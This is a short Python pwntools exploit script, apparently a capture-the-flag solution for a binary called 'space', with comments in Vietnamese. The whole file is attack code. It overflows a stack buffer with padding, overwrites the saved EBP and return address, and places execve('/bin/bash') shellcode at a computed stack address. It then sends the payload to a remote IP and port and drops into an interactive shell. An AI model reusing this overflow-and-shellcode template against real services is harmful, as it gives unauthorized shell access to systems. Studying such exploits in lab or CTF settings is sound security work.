from pwn import *

shellcode = shellcraft.execve('/bin/bash')

ebp = 0xff9ba8b8
eip = 0x8049217
# ebp_vuln_addr = 0x804b827

shellcode_addr = ebp - 0x27 + 18 + 4 # size of return addr
# ebp - 0x27: vị trí buffer 
# 18: padding
# 4 : size of eip => vi tri shellcode


payload_1 = b'A'*14 + p32(ebp) + p32(eip) + b'A'*9
payload_2 = b'C'*18 + p32(shellcode_addr) + asm(shellcode)

# r = process ("./space")
r = remote("139.59.183.98", 31502)
r.sendlineafter('>', payload_1 + payload_2)
r.recv()

r.interactive()

# ebp = 0xff9ba8b8
